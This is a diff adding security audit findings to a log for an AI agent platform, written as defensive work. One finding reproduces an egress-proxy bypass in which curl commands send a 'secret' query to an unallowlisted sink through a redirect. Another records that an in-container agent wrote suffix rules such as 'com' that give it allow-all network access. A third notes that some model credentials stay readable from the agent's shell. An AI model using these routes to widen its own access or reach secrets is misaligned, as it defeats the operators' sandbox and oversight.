@@ -548,6 +548,165 @@ platform call, and this retry happens INSIDE it.
   that `createRecord` carries no client `rkey` (`bskyd/client.go:372-376` sends
   only `repo`/`collection`/`record`).
 
+## L109 — the egress proxy follows plain-HTTP redirects and never re-checks the allowlist, so one allowlisted redirector reaches any host (2026-08-26, open — egress control bypass)
+
+`egress/proxy.go:241` runs `p.hostAllowed(host)` exactly once, on the first
+request line, then `:264` calls `p.httpClient().Do(out)`. `httpClient()`
+(`egress/proxy.go:133`) is `&http.Client{Timeout: 60s, Transport: p.transport}`
+with **no `CheckRedirect`**, so Go's default follows up to 10 hops. Each hop
+dials through `p.dialAllowed` (`egress/address.go:97`), which runs only the
+ADDRESS-class check — loopback, link-local, IMDS, optional private. It never
+calls `hostAllowed`. The name policy runs once; the redirect chain is free.
+
+- **Reproduced independently against the binary built from HEAD**
+  (`go build ./egress/cmd/egress`, `--allow localhost --allow-loopback
+  --client 127.0.0.1`, a redirector on `:18081` returning
+  `302 Location: http://127.0.0.1.nip.io:18082/exfil?secret=TOPSECRET`, a sink
+  on `:18082`; `127.0.0.1.nip.io` resolves to loopback and is NOT allowlisted):
+
+  ```
+  control: curl -x proxy http://127.0.0.1.nip.io:18082/exfil  -> HTTP=403
+  test:    curl -sL -x proxy http://localhost:18081/go
+           EXFILTRATED
+           HTTP=200 final=http://localhost:18081/go
+  sink:    SINK-HIT host=127.0.0.1.nip.io:18082 path=/exfil?secret=TOPSECRET
+  proxy:   {"msg":"deny http","host":"127.0.0.1.nip.io"}
+           {"msg":"allow http","host":"localhost","status":200}
+  ```
+
+  `final=http://localhost:18081/go` proves the CLIENT never saw the 302 — the
+  proxy followed it. The proxy log has no line for the host it actually reached,
+  so the audit trail records only the allowed first hop.
+- **HTTPS is not affected:** `handleConnect` (`egress/proxy.go:192`) splices raw
+  TCP, so a TLS redirect is re-issued by the client as a fresh `CONNECT` and
+  does hit `hostAllowed`.
+- **Live blast radius:** egress is armed on all three instances. krons journal
+  over 3 days shows constrained per-spawn proxies for `krons/content` (8 rules),
+  `rhias/niki` (4), `krons/public/marble` (7), `rhias/content` (3), `mayai` (2),
+  and sloth's `main/reading`, `main/content`, `main/code` (14 each). Every one is
+  exploitable today. The spawn network is `--internal`, so plain-HTTP traffic has
+  no route except this proxy — it goes THROUGH this path, not around it.
+- **Cause:** a forward proxy must not be an HTTP client that resolves redirects
+  on the caller's behalf; following one moves the destination decision out of
+  the request line the enforcement point reads.
+- **Fix (local):** `CheckRedirect: func(*http.Request, []*http.Request) error {
+  return http.ErrUseLastResponse }` on `httpClient()`, returning the 3xx to the
+  client so it re-requests and the new host goes through `hostAllowed`.
+  Re-checking per hop would also work but keeps the wrong shape.
+- No test in `egress/proxy_test.go`, `egress/test/e2e_test.go` or
+  `container/egress_test.go` mentions redirects.
+
+## L110 — `network_allow` refuses `*` and then accepts `com`, which is the same allow-all spelled differently; live on sloth for 2.5 months (2026-08-26, proposal — needs sign-off)
+
+`routd/network_rules_resource.go:97` refuses a bare `*` — *"opening all egress
+is an operator decision, not an agent grant"* — then hands the value to
+`match.ValidEntry` (`egress/match/match.go:94`), which accepts anything matching
+`domainRegex`, **single labels included** (deliberately, so `localhost` is a
+legal rule). At match time `match.Host` (`:64-68`) is
+`host == entry || strings.HasSuffix(host, "."+entry)`, so the stored rule `com`
+matches every `*.com` host. The repo's own test pins it as intended semantics:
+`match_test.go` — `{"single label matches its suffix", []string{"com"},
+"github.com", true}`.
+
+- **Live on sloth, written by the agent itself:**
+
+  ```
+  main/trading | com  | folder:main | 2026-06-12T20:02:44Z
+  main/trading | org  | folder:main | 2026-06-12T20:02:45Z
+  main/trading | net  | folder:main | 2026-06-12T20:02:45Z
+  main/trading | io   | folder:main | 2026-06-12T20:02:46Z
+  main/trading | ai   | folder:main | 2026-06-12T20:02:46Z
+  main/trading | co   | folder:main | 2026-06-12T20:02:47Z
+  main/trading | news | folder:main | 2026-06-12T20:02:47Z
+  main/trading | xyz  | folder:main | 2026-06-12T20:02:48Z
+  ```
+
+  `created_by='folder:main'` is the in-container agent principal
+  (`routd/mcp.go:605`, `callerSub := turnPrincipal(t.folder)`); the operator's
+  own rows on the same folder are stamped `cli`. Eight rows in four seconds is a
+  loop, not a human.
+- **The operator-visible signal lies.** sloth's journal over 3 days shows 20
+  spawns starting with `"rules":28,"allow_all":false` for that folder. It reads
+  "constrained"; it is not.
+- **Cause:** `ValidEntry` is the grammar boundary and answers "can this rule ever
+  match?" — never "does this rule match everything?". The bare-`*` check is a
+  symptom patch on one spelling.
+- **Proposed fix (cross-cutting → sign-off):** a public-suffix or label-count
+  floor in `match.ValidEntry`, or a dedicated agent-write predicate, so every
+  write path — CLI, agent tool, manifest apply — refuses a rule whose match set
+  is a whole suffix the writer does not own. It changes the shared grammar and
+  would reject existing rows. `localhost` must stay legal, which is what makes
+  the naive "require a dot" rule wrong.
+
+## L111 — the steer callback is deleted by folder without checking which run owns it, so a live run silently loses steering (2026-08-26, open)
+
+The write side is guarded: `runed/manager.go:439` `SetSteer(folder, runID, …)`
+returns early at `:442` unless `active.RunID == runID`, pinned by
+`runed/queue_concurrency_test.go:304` `TestSetSteerIgnoresStaleRunID`. The
+delete side is not:
+
+- `runed/manager.go:431` — `endRun(folder, runID, …)` takes `runID` and then
+  calls `delete(m.steerFns, folder)`, never using it.
+- `runed/manager.go:471` — `Kill` calls `delete(m.steerFns, sp.Folder)`
+  **unconditionally**, outside the `if live` block at `:462`.
+
+Two reachable failures:
+
+- **Back-to-back turns.** `Manager.spawn` writes `EndSpawn` at `:378` (the row
+  goes terminal, so `ActiveSpawnForFolder` reports the folder FREE) and only
+  calls `endRun` at `:388`. A concurrent `POST /v1/runs` for the same folder can
+  admit and reach `dockerRuntime.Run`, whose FIRST statement is
+  `spec.RegisterSteer` (`runed/docker.go:149-152`). Run B's `SetSteer` lands in
+  that window and passes its own guard; run A's `endRun` then deletes it. Run B
+  is live with no steer callback for its whole life, so every message takes
+  `admit`'s `steer != nil` false branch (`manager.go:234`) → `Busy` →
+  `routd/dispatch.go:424` leaves the cursor un-advanced and re-feeds → `Busy`
+  again, until B exits. Near the 20-minute `RunTTL` that is a 20-minute delay
+  for follow-ups that should have been written into the live container in under
+  a second.
+- **A stale `run_id`.** `DELETE /v1/runs/{run_id}` (`runed/server.go:246`) on an
+  already-terminal run kills nothing, returns 200, and still wipes that folder's
+  steer callback — which by then belongs to a different, live run.
+  `cmd/arizuko/archive.go:232` `ReleaseHold` is exactly this shape: a hold whose
+  `RunTTL` expired is terminal, and releasing it disarms whatever agent run has
+  since claimed the folder.
+- **Cause:** `steerFns` is keyed by folder but its lifetime belongs to a run.
+- **Fix (local), symmetric with `SetSteer`:** store `{runID, fn}` (or add
+  `clearSteer(folder, runID)`) and delete only on a matching `runID`.
+- **Confidence:** medium-high on the mechanism, medium on how often the first
+  shape fires — it needs a message inside a window of a few DB writes. Read end
+  to end; not reproduced live (firing a `DELETE` at a production runed was out
+  of scope).
+
+## L112 — ant scrubs 2 of the 5 model credentials from the agent's shell (2026-08-26, open — latent, zero live exposure)
+
+`ant/src/guards.ts:27` — `SECRET_ENV_VARS = ['ANTHROPIC_API_KEY',
+'CLAUDE_CODE_OAUTH_TOKEN']`. The `bash-scrub` policy (`ant/src/policy.ts:85`)
+prefixes every Bash command with an `unset` of exactly those two.
+
+The canonical set is `store/secrets.go:115` `EnvProfileKeys`, which holds
+**five**: those two plus `ANTHROPIC_OAUTH_TOKEN`, `OPENAI_API_KEY` and
+`CODEX_API_KEY`. All five reach the agent — `container/runner.go:769`
+`readSecrets()` iterates `EnvProfileKeys`, ships them over stdin, and
+`ant/src/index.ts:395-397` folds them into `turn.env`, handed to the harness at
+`ant/src/claude.ts:482`, `ant/src/codex.ts:205`, `ant/src/pi.ts:188` — i.e. into
+the CLI subprocess whose children the Bash tool is. Three of the five are
+readable with `echo $ANTHROPIC_OAUTH_TOKEN`, which is exactly what `bashScrub`
+exists to prevent.
+
+- **Live exposure: zero, measured.** The top-level `.env` and generated
+  `env/runed.env` on krons, marinade and sloth each set only
+  `CLAUDE_CODE_OAUTH_TOKEN` — and that one IS scrubbed. The `secrets` table
+  holds one row fleet-wide (`marinade / folder / atlas / GITHUB_TOKEN`), not an
+  env-profile key.
+- **It arms the moment anyone sets `OPENAI_API_KEY`, `CODEX_API_KEY` or
+  `ANTHROPIC_OAUTH_TOKEN`** — and `ANTHROPIC_OAUTH_TOKEN` was added to
+  `EnvProfileKeys` FOR the pi backend, so a pi deployment arms it by design.
+- **Cause:** two lists for one fact, in two languages.
+- **Fix (local):** derive the TS list from the same five names — better, have
+  the container hand ant the key set it injected, so there is one declaration
+  and two readers.
+
 ## ✅ FIXED 2026-08-25 L95 — a social mutation verb left no trace anywhere (2026-08-25)
 
 `regSocial` (`ipc/ipc.go:1368`) writes a `messages` row only when the verb sets
